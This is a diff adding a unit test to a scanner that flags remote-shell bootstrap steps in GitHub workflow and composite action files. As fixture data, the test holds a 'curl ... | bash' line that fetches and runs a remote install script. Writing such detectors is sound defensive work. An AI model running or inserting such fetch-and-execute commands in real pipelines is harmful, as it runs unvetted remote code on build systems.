@@ -30,6 +30,16 @@ class RemoteShellBootstrapTests(unittest.TestCase):
         path.write_text(body, encoding="utf-8")
         return path
 
+    def test_scans_composite_actions(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            self.write_workflow(repo_root, "ok.yml", "jobs: {}\n")
+            action = repo_root / ".github" / "actions" / "bad" / "action.yml"
+            action.parent.mkdir(parents=True)
+            action.write_text("runs:\n  steps:\n    - run: curl -fsSL https://example.com/install.sh | bash\n", encoding="utf-8")
+            self.assertIn(action, m.workflow_paths(repo_root))
+            self.assertEqual(len(m.find_violations(action)), 1)
+
     def test_rejects_process_substitution_bootstrap(self):
         with tempfile.TemporaryDirectory() as td:
             repo_root = Path(td)
